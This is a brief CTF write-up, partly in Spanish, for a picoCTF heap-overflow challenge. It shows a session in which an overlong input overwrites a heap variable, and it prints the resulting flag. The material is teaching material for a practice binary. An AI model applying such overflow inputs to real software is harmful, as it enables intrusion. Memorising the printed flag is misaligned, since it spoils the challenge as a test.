
## Objetivo
#### Description

Are overflows just a stack concern?Download the binary [here](https://artifacts.picoctf.net/c_tethys/28/chall).Download the source [here](https://artifacts.picoctf.net/c_tethys/28/chall.c).

Additional details will be available after launching your challenge instance.
## Solución
```
Enter your choice: 2
Data for buffer: kjasdfklanlfnalfandflandlfknalkklandflkanfldanlfnañflkdnalknflakndflkanfklanñfklnañdklfnalknflakndflñkanfñklanfklñnañlkdnfaklñndflknafdlknalñndflañnflknakfnañldknfañndfañlndsñ

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = landflkanfldanlfnañflkdnalknfla3
dflkanfklanñfklnañdklfnalknflakndflñkanfñklanfklñnañlkdnfaklñndflknafdlknalñndflañnflknakfnañldknfañndfañlndsñ


1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_76775c7c}
```
## Notas adicionales

## Referencias
